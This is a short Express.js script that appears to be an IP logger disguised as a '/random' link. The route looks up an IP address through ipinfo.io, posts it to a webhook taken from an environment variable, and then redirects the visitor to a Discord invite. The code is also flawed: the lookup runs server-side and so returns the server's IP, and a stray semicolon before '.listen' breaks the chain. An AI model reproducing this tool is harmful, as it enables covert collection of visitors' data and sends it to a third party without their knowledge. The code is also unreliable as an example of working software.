import express from 'express';

express()
  .get("/random", async (req, res) => {
  const got = await fetch ("https://ipinfo.io/json").then(r => r.json());
  fetch (process.env.hook, {
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({content:`${got.ip}`})
})
  res.redirect("https://discord.gg/acvr");
});
.listen(3000);
